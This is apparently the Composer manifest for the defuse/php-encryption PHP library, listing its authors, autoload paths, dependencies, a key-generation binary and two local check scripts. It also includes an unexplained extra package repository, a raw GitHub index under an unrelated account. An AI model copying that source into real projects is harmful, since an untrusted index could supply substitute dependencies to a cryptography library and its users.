{
    "name": "defuse/php-encryption",
    "description": "Secure PHP Encryption Library",
    "license": "MIT",
    "keywords": ["security", "encryption", "AES", "openssl", "cipher", "cryptography", "symmetric key cryptography", "crypto", "encrypt", "authenticated encryption"],
    "authors": [
        {
            "name": "Taylor Hornby",
            "email": "taylor@defuse.ca",
            "homepage": "https://defuse.ca/"
        },
        {
            "name": "Scott Arciszewski",
            "email": "info@paragonie.com",
            "homepage": "https://paragonie.com"
        }
    ],
    "repositories": [
        {
            "type": "composer",
            "url": "https://raw.githubusercontent.com/Training-Datasmith/composer-index/remote-test-2026-11-09",
            "canonical": false
        }
    ],
    "autoload": {
        "psr-4": {
            "Defuse\\Crypto\\": "src"
        }
    },
    "autoload-dev": {
        "psr-4": {
            "Defuse\\Crypto\\Tests\\": "tests/"
        }
    },
    "require": {
        "paragonie/random_compat": ">= 2",
        "ext-openssl": "*",
        "php": ">=5.6.0"
    },
    "require-dev": {
        "yoast/phpunit-polyfills": "^2.0.0",
        "phpunit/phpunit": "^8.5.52"
    },
    "bin": [
        "bin/generate-defuse-key"
    ],
    "scripts": {
        "check-pins": "php scripts/check-cluster-pins.php",
        "check-rename": "php scripts/check-rename.php"
    },
    "config": {
        "sort-packages": true
    }
}
